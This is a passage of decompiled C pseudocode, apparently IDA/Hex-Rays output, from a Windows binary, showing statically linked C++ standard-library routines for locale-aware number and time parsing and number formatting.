    goto LABEL_7;
  }
  v13 = _Stoulx(v21, &v17, v12, &v19);
  v14 = v20;
  *v20 = v13;
  if ( v17 == (int *)v21 || v19 )
    goto LABEL_6;
LABEL_7:
  if ( (unsigned __int8)std::istreambuf_iterator<wchar_t>::equal(&a5) )
    *v10 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 442CC6: using guessed type _DWORD __stdcall std::istreambuf_iterator<wchar_t>::equal(_DWORD);
// 446626: using guessed type _DWORD __cdecl _Stoulx(_DWORD, _DWORD, _DWORD, _DWORD);
// 43F13D: using guessed type _BYTE var_30[44];

//----- (0043F5CC) --------------------------------------------------------
int *__thiscall sub_43F5CC(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _WORD *a9)
{
  int v10; // esi
  _DWORD *v11; // ebx
  int v12; // eax
  int v13; // edi
  _WORD *v14; // eax
  int *v15; // esi
  unsigned int v16; // eax
  _WORD *v17; // ecx
  int *result; // eax
  const struct std::locale *v19; // [esp-4h] [ebp-5Ch]
  int *v20; // [esp+14h] [ebp-44h] BYREF
  int v21; // [esp+18h] [ebp-40h] BYREF
  int v22; // [esp+1Ch] [ebp-3Ch] BYREF
  _WORD *v23; // [esp+20h] [ebp-38h]
  bool v24; // [esp+27h] [ebp-31h]
  char v25; // [esp+28h] [ebp-30h] BYREF
  int v26; // [esp+29h] [ebp-2Fh] BYREF
  int v27; // [esp+54h] [ebp-4h]

  v10 = a7;
  v11 = a8;
  v19 = *(const struct std::locale **)(a7 + 48);
  v23 = a9;
  std::locale::locale((std::locale *)&v21, v19);
  v27 = 0;
  v12 = std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getifld(
          (int)this,
          (int)&v25,
          (int)&a3,
          (int)&a5,
          *(_DWORD *)(v10 + 20),
          (std::locale *)&v21);
  v27 = -1;
  v13 = v12;
  sub_42DEE0(&v21);
  if ( v25 )
  {
    v15 = (int *)&v25;
    v24 = v25 == 45;
    if ( v25 == 45 )
      v15 = &v26;
    v16 = _Stoulx(v15, &v20, v13, &v22);
    v17 = v23;
    *v23 = v16;
    if ( v20 == v15 || v22 || v16 > 0xFFFF )
    {
      *v11 = 2;
      *v17 = -1;
    }
    else if ( v24 )
    {
      *v17 = -(__int16)v16;
    }
  }
  else
  {
    v14 = v23;
    *v11 = 2;
    *v14 = 0;
  }
  if ( (unsigned __int8)std::istreambuf_iterator<wchar_t>::equal(&a5) )
    *v11 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 442CC6: using guessed type _DWORD __stdcall std::istreambuf_iterator<wchar_t>::equal(_DWORD);
// 446626: using guessed type _DWORD __cdecl _Stoulx(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0043F6BA) --------------------------------------------------------
_DWORD *__stdcall sub_43F6BA(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8)
{
  int *v8; // eax
  int v9; // esi
  int v10; // edx
  _DWORD *result; // eax
  char v12[8]; // [esp+4h] [ebp-Ch] BYREF
  int v13; // [esp+Ch] [ebp-4h] BYREF

  v8 = (int *)unknown_libname_70(v12, a2, a3, a4, a5, a6, a7, &v13);
  v9 = *v8;
  v10 = v8[1];
  *a8 = v13;
  result = a1;
  *a1 = v9;
  a1[1] = v10;
  return result;
}
// 43F7C1: using guessed type _DWORD __stdcall unknown_libname_70(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43F6BA: using guessed type char var_C[8];

//----- (0043F885) --------------------------------------------------------
_DWORD *__thiscall sub_43F885(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, float *a9)
{
  float *v9; // ebx
  _DWORD *v10; // esi
  int v11; // eax
  double v12; // st7
  double v13; // st7
  _DWORD *result; // eax
  float v15; // [esp+0h] [ebp-340h]
  int v16; // [esp+14h] [ebp-32Ch] BYREF
  char *v17; // [esp+18h] [ebp-328h] BYREF
  float v18; // [esp+1Ch] [ebp-324h]
  int v19; // [esp+20h] [ebp-320h] BYREF
  char v20[792]; // [esp+24h] [ebp-31Ch] BYREF

  v9 = a9;
  v10 = a8;
  v19 = 1000000000;
  v11 = std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getffld(this, v20, &a3, &a5, a7, &v19);
  if ( !v20[0] || (v18 = std::_Stofx_v2(v20, &v17, v11, &v16), v12 = v18, *v9 = v18, v17 == v20) || v16 )
  {
    v13 = 0.0;
    *v10 = 2;
    goto LABEL_7;
  }
  if ( v19 != 1000000000 && v19 )
  {
    v15 = v12;
    v13 = sub_434082(v15, 4 * v19);
LABEL_7:
    *v9 = v13;
  }
  if ( (unsigned __int8)std::istreambuf_iterator<wchar_t>::equal(&a5) )
    *v10 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 438A13: using guessed type _DWORD __cdecl std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getffld(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 442CC6: using guessed type _DWORD __stdcall std::istreambuf_iterator<wchar_t>::equal(_DWORD);

//----- (0043F980) --------------------------------------------------------
_DWORD *__thiscall sub_43F980(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, double *a9)
{
  double *v9; // ebx
  _DWORD *v10; // esi
  int v11; // eax
  double X; // st7
  double v13; // st7
  _DWORD *result; // eax
  int v15; // [esp+18h] [ebp-328h] BYREF
  char *v16; // [esp+1Ch] [ebp-324h] BYREF
  int v17; // [esp+20h] [ebp-320h] BYREF
  char v18[792]; // [esp+24h] [ebp-31Ch] BYREF

  v9 = a9;
  v10 = a8;
  v17 = 1000000000;
  v11 = std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getffld(this, v18, &a3, &a5, a7, &v17);
  if ( !v18[0] || (X = std::_Stodx_v2(v18, &v16, v11, &v15), *v9 = X, v16 == v18) || v15 )
  {
    v13 = 0.0;
    *v10 = 2;
    goto LABEL_7;
  }
  if ( v17 != 1000000000 && v17 )
  {
    v13 = ldexp(X, 4 * v17);
LABEL_7:
    *v9 = v13;
  }
  if ( (unsigned __int8)std::istreambuf_iterator<wchar_t>::equal(&a5) )
    *v10 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 438A13: using guessed type _DWORD __cdecl std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getffld(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 442CC6: using guessed type _DWORD __stdcall std::istreambuf_iterator<wchar_t>::equal(_DWORD);

//----- (0043FA71) --------------------------------------------------------
_DWORD *__thiscall sub_43FA71(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, double *a9)
{
  int *v9; // eax
  int v10; // edx
  int v11; // ecx
  _DWORD *result; // eax
  int v13; // [esp+0h] [ebp-10h] BYREF
  double v14; // [esp+8h] [ebp-8h] BYREF

  v9 = sub_43F980(this, &v13, a3, a4, a5, a6, a7, a8, &v14);
  v10 = *v9;
  v11 = v9[1];
  *a9 = v14;
  result = a2;
  *a2 = v10;
  a2[1] = v11;
  return result;
}

//----- (0043FAB2) --------------------------------------------------------
int *__thiscall sub_43FAB2(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _DWORD *a9)
{
  _DWORD *v10; // edi
  int v11; // eax
  int v12; // esi
  int v13; // eax
  _DWORD *v14; // ecx
  int *result; // eax
  const struct std::locale *v16; // [esp-4h] [ebp-54h]
  int *v17; // [esp+10h] [ebp-40h] BYREF
  int v18; // [esp+14h] [ebp-3Ch] BYREF
  int v19; // [esp+18h] [ebp-38h] BYREF
  _DWORD *v20; // [esp+1Ch] [ebp-34h]
  _BYTE v21[44]; // [esp+20h] [ebp-30h] BYREF
  int v22; // [esp+4Ch] [ebp-4h]

  v10 = a8;
  v16 = *(const struct std::locale **)(a7 + 48);
  v20 = a9;
  std::locale::locale((std::locale *)&v18, v16);
  v22 = 0;
  v11 = std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getifld(
          (int)this,
          (int)v21,
          (int)&a3,
          (int)&a5,
          2048,
          (std::locale *)&v18);
  v22 = -1;
  v12 = v11;
  sub_42DEE0(&v18);
  if ( !v21[0] )
  {
    v14 = v20;
LABEL_6:
    *v10 = 2;
    *v14 = 0;
    goto LABEL_7;
  }
  v13 = _Stoulx(v21, &v17, v12, &v19);
  v14 = v20;
  *v20 = v13;
  if ( v17 == (int *)v21 || v19 )
    goto LABEL_6;
LABEL_7:
  if ( (unsigned __int8)std::istreambuf_iterator<wchar_t>::equal(&a5) )
    *v10 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 442CC6: using guessed type _DWORD __stdcall std::istreambuf_iterator<wchar_t>::equal(_DWORD);
// 446626: using guessed type _DWORD __cdecl _Stoulx(_DWORD, _DWORD, _DWORD, _DWORD);
// 43FAB2: using guessed type _BYTE var_30[44];

//----- (0043FF41) --------------------------------------------------------
int *__thiscall sub_43FF41(
        void *this,
        int *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int *a8,
        _DWORD *a9,
        char a10,
        int a11)
{
  int v12; // ebx
  struct std::_Facet_base *v13; // eax
  int *v14; // esi
  int v15; // ecx
  int *v16; // eax
  int v17; // ecx
  int v18; // ecx
  int v19; // eax
  int v20; // ecx
  int v21; // ecx
  int v22; // eax
  int v23; // ecx
  int *result; // eax
  int v25; // [esp-Ch] [ebp-38h]
  int v26; // [esp-Ch] [ebp-38h]
  _DWORD *v27; // [esp-8h] [ebp-34h]
  _DWORD *v28; // [esp-8h] [ebp-34h]
  int v29; // [esp-4h] [ebp-30h]
  int v30; // [esp-4h] [ebp-30h]
  int v31; // [esp+10h] [ebp-1Ch] BYREF
  int v32; // [esp+14h] [ebp-18h] BYREF
  char v33[4]; // [esp+18h] [ebp-14h] BYREF
  struct std::_Facet_base *v34; // [esp+1Ch] [ebp-10h]
  int v35; // [esp+28h] [ebp-4h]

  v12 = a7;
  std::locale::locale((std::locale *)&v31, *(const struct std::locale **)(a7 + 48));
  v35 = 0;
  v13 = sub_435C7D((std::locale *)&v31);
  v35 = -1;
  v34 = v13;
  sub_42DEE0(&v31);
  v14 = a8;
  v15 = a10 - 65;
  v32 = 0;
  *a8 = 0;
  switch ( v15 )
  {
    case 0:
    case 32:
      v16 = (int *)unknown_libname_83(&v31, a3, a4, a5, a6, v12, v14, a9);
      goto LABEL_3;
    case 1:
    case 33:
    case 39:
      v16 = (int *)unknown_libname_82(&v31, a3, a4, a5, a6, v12, v14, a9);
      goto LABEL_3;
    case 2:
      v17 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 0, 99, &v32, v34) | *v14;
      *v14 = v17;
      if ( (v17 & 2) != 0 )
        break;
      v18 = 100 * (v32 - 19);
      goto LABEL_9;
    case 3:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%m / %d / %y");
      goto LABEL_3;
    case 7:
      v30 = (int)v34;
      v28 = a9 + 2;
      v26 = 23;
      goto LABEL_15;
    case 8:
      v20 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 1, 12, &v32, v34) | *v14;
      *v14 = v20;
      if ( (v20 & 2) == 0 )
        a9[2] = v32 != 12 ? v32 : 0;
      break;
    case 12:
      v30 = (int)v34;
      v28 = a9 + 1;
      v26 = 59;
      goto LABEL_15;
    case 17:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%H : %M");
      goto LABEL_3;
    case 18:
      v30 = (int)v34;
      v28 = a9;
      v26 = 60;
      goto LABEL_15;
    case 19:
    case 23:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%H : %M : %S");
      goto LABEL_3;
    case 20:
    case 22:
      v30 = (int)v34;
      v28 = a9 + 7;
      v26 = 53;
      goto LABEL_15;
    case 24:
      v16 = (int *)unknown_libname_84(v33, a3, a4, a5, a6, v12, v14, a9);
      goto LABEL_3;
    case 34:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%b %d %H : %M : %S %Y");
      goto LABEL_3;
    case 35:
    case 36:
      v29 = (int)v34;
      v27 = a9 + 3;
      v25 = 31;
      goto LABEL_11;
    case 41:
      v29 = (int)v34;
      v27 = a9 + 7;
      v25 = 366;
LABEL_11:
      v19 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 1, v25, v27, v29);
      goto LABEL_12;
    case 44:
      v21 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 1, 12, &v32, v34) | *v14;
      *v14 = v21;
      if ( (v21 & 2) == 0 )
        a9[4] = v32 - 1;
      break;
    case 45:
    case 51:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     " ");
      goto LABEL_3;
    case 47:
      v22 = std::_Getloctxt<char,std::istreambuf_iterator<wchar_t>>((int)&a3, (int)&a5, 0, (int)":AM:am:PM:pm");
      if ( v22 >= 0 )
      {
        if ( v22 > 1 )
          a9[2] += 12;
      }
      else
      {
        *v14 |= 2u;
      }
      break;
    case 49:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%I : %M : %S %p");
      goto LABEL_3;
    case 54:
      v30 = (int)v34;
      v28 = a9 + 6;
      v26 = 6;
LABEL_15:
      v19 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 0, v26, v28, v30);
LABEL_12:
      *v14 |= v19;
      break;
    case 55:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%d / %m / %y");
LABEL_3:
      a3 = *v16;
      a4 = v16[1];
      break;
    case 56:
      v23 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 0, 99, &v32, v34) | *v14;
      *v14 = v23;
      if ( (v23 & 2) == 0 )
      {
        v18 = v32;
        if ( v32 < 69 )
          v18 = v32 + 100;
LABEL_9:
        a9[5] = v18;
      }
      break;
    default:
      *v14 = 2;
      break;
  }
  if ( (unsigned __int8)std::istreambuf_iterator<wchar_t>::equal(&a5) )
    *v14 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 43A01C: using guessed type _DWORD __stdcall std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43AB0C: using guessed type _DWORD __cdecl std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 442CC6: using guessed type _DWORD __stdcall std::istreambuf_iterator<wchar_t>::equal(_DWORD);
// 442D40: using guessed type _DWORD __stdcall unknown_libname_82(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 442D78: using guessed type _DWORD __stdcall unknown_libname_83(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 442DB0: using guessed type _DWORD __stdcall unknown_libname_84(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FF41: using guessed type char var_14[4];

//----- (004402E6) --------------------------------------------------------
int *__thiscall sub_4402E6(
        void *this,
        int *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int *a8,
        _DWORD *a9,
        char a10,
        int a11)
{
  int v12; // ebx
  struct std::_Facet_base *v13; // eax
  int *v14; // esi
  int v15; // ecx
  int *v16; // eax
  int v17; // ecx
  int v18; // ecx
  int v19; // eax
  int v20; // ecx
  int v21; // ecx
  int v22; // eax
  int v23; // ecx
  int *result; // eax
  int v25; // [esp-Ch] [ebp-38h]
  int v26; // [esp-Ch] [ebp-38h]
  _DWORD *v27; // [esp-8h] [ebp-34h]
  _DWORD *v28; // [esp-8h] [ebp-34h]
  int v29; // [esp-4h] [ebp-30h]
  int v30; // [esp-4h] [ebp-30h]
  int v31; // [esp+10h] [ebp-1Ch] BYREF
  int v32; // [esp+14h] [ebp-18h] BYREF
  char v33[4]; // [esp+18h] [ebp-14h] BYREF
  struct std::_Facet_base *v34; // [esp+1Ch] [ebp-10h]
  int v35; // [esp+28h] [ebp-4h]

  v12 = a7;
  std::locale::locale((std::locale *)&v31, *(const struct std::locale **)(a7 + 48));
  v35 = 0;
  v13 = sub_435D12((std::locale *)&v31);
  v35 = -1;
  v34 = v13;
  sub_42DEE0(&v31);
  v14 = a8;
  v15 = a10 - 65;
  v32 = 0;
  *a8 = 0;
  switch ( v15 )
  {
    case 0:
    case 32:
      v16 = (int *)unknown_libname_83(&v31, a3, a4, a5, a6, v12, v14, a9);
      goto LABEL_3;
    case 1:
    case 33:
    case 39:
      v16 = (int *)unknown_libname_82(&v31, a3, a4, a5, a6, v12, v14, a9);
      goto LABEL_3;
    case 2:
      v17 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 0, 99, &v32, v34) | *v14;
      *v14 = v17;
      if ( (v17 & 2) != 0 )
        break;
      v18 = 100 * (v32 - 19);
      goto LABEL_9;
    case 3:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%m / %d / %y");
      goto LABEL_3;
    case 7:
      v30 = (int)v34;
      v28 = a9 + 2;
      v26 = 23;
      goto LABEL_15;
    case 8:
      v20 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 1, 12, &v32, v34) | *v14;
      *v14 = v20;
      if ( (v20 & 2) == 0 )
        a9[2] = v32 != 12 ? v32 : 0;
      break;
    case 12:
      v30 = (int)v34;
      v28 = a9 + 1;
      v26 = 59;
      goto LABEL_15;
    case 17:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%H : %M");
      goto LABEL_3;
    case 18:
      v30 = (int)v34;
      v28 = a9;
      v26 = 60;
      goto LABEL_15;
    case 19:
    case 23:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%H : %M : %S");
      goto LABEL_3;
    case 20:
    case 22:
      v30 = (int)v34;
      v28 = a9 + 7;
      v26 = 53;
      goto LABEL_15;
    case 24:
      v16 = (int *)unknown_libname_84(v33, a3, a4, a5, a6, v12, v14, a9);
      goto LABEL_3;
    case 34:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%b %d %H : %M : %S %Y");
      goto LABEL_3;
    case 35:
    case 36:
      v29 = (int)v34;
      v27 = a9 + 3;
      v25 = 31;
      goto LABEL_11;
    case 41:
      v29 = (int)v34;
      v27 = a9 + 7;
      v25 = 366;
LABEL_11:
      v19 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 1, v25, v27, v29);
      goto LABEL_12;
    case 44:
      v21 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 1, 12, &v32, v34) | *v14;
      *v14 = v21;
      if ( (v21 & 2) == 0 )
        a9[4] = v32 - 1;
      break;
    case 45:
    case 51:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     " ");
      goto LABEL_3;
    case 47:
      v22 = std::_Getloctxt<char,std::istreambuf_iterator<wchar_t>>((int)&a3, (int)&a5, 0, (int)":AM:am:PM:pm");
      if ( v22 >= 0 )
      {
        if ( v22 > 1 )
          a9[2] += 12;
      }
      else
      {
        *v14 |= 2u;
      }
      break;
    case 49:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%I : %M : %S %p");
      goto LABEL_3;
    case 54:
      v30 = (int)v34;
      v28 = a9 + 6;
      v26 = 6;
LABEL_15:
      v19 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 0, v26, v28, v30);
LABEL_12:
      *v14 |= v19;
      break;
    case 55:
      v16 = (int *)std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%d / %m / %y");
LABEL_3:
      a3 = *v16;
      a4 = v16[1];
      break;
    case 56:
      v23 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 0, 99, &v32, v34) | *v14;
      *v14 = v23;
      if ( (v23 & 2) == 0 )
      {
        v18 = v32;
        if ( v32 < 69 )
          v18 = v32 + 100;
LABEL_9:
        a9[5] = v18;
      }
      break;
    default:
      *v14 = 2;
      break;
  }
  if ( (unsigned __int8)std::istreambuf_iterator<wchar_t>::equal(&a5) )
    *v14 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 43A171: using guessed type _DWORD __stdcall std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43AB0C: using guessed type _DWORD __cdecl std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 442CC6: using guessed type _DWORD __stdcall std::istreambuf_iterator<wchar_t>::equal(_DWORD);
// 442D40: using guessed type _DWORD __stdcall unknown_libname_82(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 442D78: using guessed type _DWORD __stdcall unknown_libname_83(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 442DB0: using guessed type _DWORD __stdcall unknown_libname_84(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4402E6: using guessed type char var_14[4];

//----- (004412AB) --------------------------------------------------------
_DWORD *__thiscall sub_4412AB(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, int a9)
{
  struct std::_Facet_base *v10; // eax
  struct std::_Facet_base *v11; // esi
  int v12; // eax
  int v13; // eax
  _DWORD *result; // eax
  int v15; // [esp+10h] [ebp-14h] BYREF
  int v16[3]; // [esp+14h] [ebp-10h] BYREF
  int v17; // [esp+20h] [ebp-4h]

  std::locale::locale((std::locale *)&v15, *(const struct std::locale **)(a7 + 48));
  v17 = 0;
  v10 = sub_435C7D((std::locale *)&v15);
  v17 = -1;
  v11 = v10;
  sub_42DEE0(&v15);
  v16[0] = 0;
  v12 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 0, 9999, v16, v11);
  *a8 |= v12;
  if ( (v12 & 2) == 0 )
  {
    v13 = v16[0];
    if ( v16[0] >= 69 )
    {
      if ( v16[0] >= 100 )
        v13 = v16[0] - 1900;
    }
    else
    {
      v13 = v16[0] + 100;
    }
    *(_DWORD *)(a9 + 20) = v13;
  }
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 43AB0C: using guessed type _DWORD __cdecl std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4412AB: using guessed type int var_10[3];

//----- (00441340) --------------------------------------------------------
_DWORD *__thiscall sub_441340(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, int a9)
{
  struct std::_Facet_base *v10; // eax
  struct std::_Facet_base *v11; // esi
  int v12; // eax
  int v13; // eax
  _DWORD *result; // eax
  int v15; // [esp+10h] [ebp-14h] BYREF
  int v16[3]; // [esp+14h] [ebp-10h] BYREF
  int v17; // [esp+20h] [ebp-4h]

  std::locale::locale((std::locale *)&v15, *(const struct std::locale **)(a7 + 48));
  v17 = 0;
  v10 = sub_435D12((std::locale *)&v15);
  v17 = -1;
  v11 = v10;
  sub_42DEE0(&v15);
  v16[0] = 0;
  v12 = std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(this, &a3, &a5, 0, 9999, v16, v11);
  *a8 |= v12;
  if ( (v12 & 2) == 0 )
  {
    v13 = v16[0];
    if ( v16[0] >= 69 )
    {
      if ( v16[0] >= 100 )
        v13 = v16[0] - 1900;
    }
    else
    {
      v13 = v16[0] + 100;
    }
    *(_DWORD *)(a9 + 20) = v13;
  }
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 43AB0C: using guessed type _DWORD __cdecl std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 441340: using guessed type int var_10[3];

//----- (00441542) --------------------------------------------------------
_DWORD *__thiscall sub_441542(void **this, _DWORD *a2)
{
  sub_43694D(a2, this[6]);
  return a2;
}

//----- (00441557) --------------------------------------------------------
_DWORD *__thiscall sub_441557(void **this, _DWORD *a2)
{
  sub_409C20(a2, this[6]);
  return a2;
}

//----- (0044156C) --------------------------------------------------------
int __stdcall sub_44156C(int a1, int a2)
{
  return -1;
}

//----- (00441C86) --------------------------------------------------------
int __thiscall sub_441C86(void *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  const char *v8; // eax
  int v9; // eax
  char Buffer[64]; // [esp+Ch] [ebp-4Ch] BYREF
  char v12[8]; // [esp+4Ch] [ebp-Ch] BYREF

  v8 = (const char *)unknown_libname_19(this, v12, "lu", *(_DWORD *)(a5 + 20));
  v9 = sprintf_s(Buffer, 0x40u, v8, a7);
  std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Iput((int)this, a2, a3, a4, a5, a6, (int)Buffer, v9);
  return a2;
}
// 43232C: using guessed type _DWORD __cdecl unknown_libname_19(_DWORD, _DWORD, _DWORD, _DWORD);
// 441C86: using guessed type char var_C[8];

//----- (00441CF1) --------------------------------------------------------
int __thiscall sub_441CF1(void *this, int a2, int a3, int a4, _DWORD *a5, int a6, double X)
{
  int v7; // esi
  int v8; // eax
  int v9; // ebx
  int v10; // ebx
  const char *v11; // eax
  char *v12; // ecx
  int v13; // eax
  char *v14; // ecx
  char *v15; // ecx
  int Y; // [esp+20h] [ebp-38h] BYREF
  unsigned int v18; // [esp+24h] [ebp-34h] BYREF
  char Buffer[4]; // [esp+28h] [ebp-30h] BYREF
  size_t BufferCount; // [esp+38h] [ebp-20h]
  unsigned int v21; // [esp+3Ch] [ebp-1Ch]
  char v22[20]; // [esp+40h] [ebp-18h] BYREF
  int v23; // [esp+54h] [ebp-4h]

  v18 = (unsigned int)this;
  BufferCount = 0;
  v21 = 15;
  Buffer[0] = 0;
  v7 = a5[6];
  v8 = a5[5] & 0x3000;
  v23 = 0;
  if ( __SPAIR64__(a5[7], v7) > 0 || v8 == 0x2000 )
  {
    v9 = v7;
    if ( v8 == 0x2000 && fabs(X) > 1.0e10 )
    {
      frexp(X, &Y);
      v9 = (int)(30103 * abs32(Y)) / 100000 + v7;
    }
  }
  else
  {
    v7 = 6;
    v9 = 6;
  }
  sub_40E9F0(Buffer, v9 + 50, 0);
  v10 = v18;
  v11 = (const char *)unknown_libname_18(v18, v22, 0, a5[5]);
  v12 = Buffer;
  if ( v21 >= 0x10 )
    v12 = *(char **)Buffer;
  v13 = sprintf_s(v12, BufferCount, v11, v7, X);
  v14 = Buffer;
  if ( v21 >= 0x10 )
    v14 = *(char **)Buffer;
  std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Fput(v10, a2, a3, a4, (int)a5, a6, v14, v13);
  if ( v21 >= 0x10 )
  {
    v15 = *(char **)Buffer;
    v18 = v21 + 1;
    Y = *(_DWORD *)Buffer;
    if ( v21 + 1 >= 0x1000 )
    {
      std::_Adjust_manually_vector_aligned((void **)&Y, &v18);
      v15 = (char *)Y;
    }
    sub_44775B(v15);
  }
